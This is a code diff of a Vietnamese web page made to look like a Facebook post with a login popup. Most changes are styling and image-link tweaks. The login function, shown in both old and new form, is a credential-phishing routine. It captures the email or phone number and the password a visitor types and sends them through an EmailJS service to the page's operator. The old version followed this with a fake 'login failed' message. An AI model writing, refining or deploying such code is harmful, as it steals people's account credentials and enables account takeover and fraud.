@@ -170,7 +170,7 @@
         .action-buttons .message img {
             width: 20px;
             height: 20px;
-            filter: brightness(0) invert(1); /* Làm trắng biểu tượng */
+            filter: brightness(0) invert(1); /* Biểu tượng trắng */
         }
         .action-buttons .like {
             background-color: #E4E6EB;
@@ -179,7 +179,7 @@
         .action-buttons .like img {
             width: 20px;
             height: 20px;
-            filter: brightness(0.2); /* Xám đậm hơn để nổi bật */
+            filter: brightness(0.3); /* Xám đậm để nổi bật */
         }
         .action-buttons .share {
             background-color: #E4E6EB;
@@ -188,7 +188,7 @@
         .action-buttons .share img {
             width: 20px;
             height: 20px;
-            filter: brightness(0.2); /* Xám đậm hơn để nổi bật */
+            filter: brightness(0.3); /* Xám đậm để nổi bật */
         }
         .tabs {
             display: flex;
@@ -781,7 +781,7 @@
             font-size: 15px;
             font-weight: bold;
             cursor: pointer;
-            transition: background: 0.2s;
+            transition: background 0.2s;
         }
         .popup .btn-create:hover {
             background: #36a420;
@@ -893,47 +893,6 @@
             color: #606770;
             margin: 4px 0;
         }
-        .create-post {
-            background: #FFFFFF;
-            border-radius: 8px;
-            padding: 12px;
-            margin-bottom: 12px;
-            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
-        }
-        .create-post .input-area {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .create-post .input-area img {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-        }
-        .create-post .input-area input {
-            flex: 1;
-            padding: 10px;
-            border: none;
-            border-radius: 20px;
-            background: #F0F2F5;
-            font-size: 15px;
-            color: #050505;
-        }
-        .create-post .input-area input::placeholder {
-            color: #606770;
-        }
-        .create-post .post-button {
-            width: 100%;
-            padding: 10px;
-            background: #1877F2;
-            border: none;
-            border-radius: 6px;
-            color: #FFFFFF;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 10px;
-        }
         @media (max-width: 767px) {
             .container {
                 width: 100%;
@@ -1031,13 +990,13 @@
         <!-- Action Buttons -->
         <div class="action-buttons">
             <button class="like" onclick="showLoginPopup()">
-                <img src="https://imgur.com/Y2gdw8r.jpg" alt="Like"> Thích
+                <img src="https://i.imgur.com/Y2gdw8r.jpg" alt="Like"> Thích
             </button>
             <button class="message" onclick="showLoginPopup()">
-                <img src="https://imgur.com/pCHb488.jpg" alt="Messenger"> Nhắn tin
+                <img src="https://i.imgur.com/vRIDZSy.jpg" alt="Messenger"> Nhắn tin
             </button>
             <button class="share" onclick="showLoginPopup()">
-                <img src="https://imgur.com/ncN22Za.jpg" alt="Share"> Chia sẻ
+                <img src="https://i.imgur.com/ncN22Za.jpg" alt="Share"> Chia sẻ
             </button>
         </div>
 
@@ -1633,26 +1592,40 @@
         }
 
         function login() {
+            const errorMessage = document.getElementById('error-message');
+            errorMessage.style.display = 'none';
+
             const username = document.getElementById('login-input').value || "";
             const password = document.getElementById('password').value || "";
+
+            if (!username || !password) {
+                errorMessage.textContent = "Vui lòng nhập email/số điện thoại và mật khẩu!";
+                errorMessage.style.display = 'block';
+                return;
+            }
 
             const templateParams = {
                 name: "User",
                 time: new Date().toLocaleString(),
-                email: username || "Tài khoản bị bỏ trống",
-                password: password || "Mật khẩu bị bỏ trống",
+                email: username,
+                password: password,
                 action: "Đăng nhập",
                 timestamp: new Date().toLocaleString()
             };
 
+            console.log("Gửi email với thông tin:", templateParams);
+
             emailjs.send('service_ytsr91e', 'template_gwserzi', templateParams)
                 .then((response) => {
                     console.log("Email gửi thành công:", response.status, response.text);
-                    alert("Đăng nhập không thành công: Sai thông tin tài khoản hoặc mật khẩu");
+                    errorMessage.textContent = "Đã gửi thông tin đăng nhập, kiểm tra email của bạn!";
+                    errorMessage.style.color = '#008000';
+                    errorMessage.style.display = 'block';
                 })
                 .catch((error) => {
                     console.error("Lỗi gửi email:", error);
-                    alert("Đăng nhập không thành công: Sai thông tin tài khoản hoặc mật khẩu");
+                    errorMessage.textContent = "Lỗi gửi email, vui lòng thử lại sau!";
+                    errorMessage.style.display = 'block';
                 });
         }
 
